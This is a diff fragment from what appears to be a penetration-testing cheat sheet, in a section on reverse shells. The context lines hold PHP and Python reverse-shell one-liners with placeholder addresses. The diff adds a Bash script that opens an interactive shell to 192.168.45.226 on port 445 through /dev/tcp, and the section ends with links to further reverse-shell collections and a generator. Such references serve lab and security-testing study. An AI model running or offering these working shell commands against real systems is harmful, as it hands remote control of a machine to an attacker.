@@ -3933,6 +3933,13 @@ php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
+**Bash**
+```bash
+#!/bin/bash
+/usr/bin/bash -i >& /dev/tcp/192.168.45.226/445 0>&1
+```
+
+
 **More shells**
 - [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 - [Reverse Shell Generator](https://www.revshells.com/)
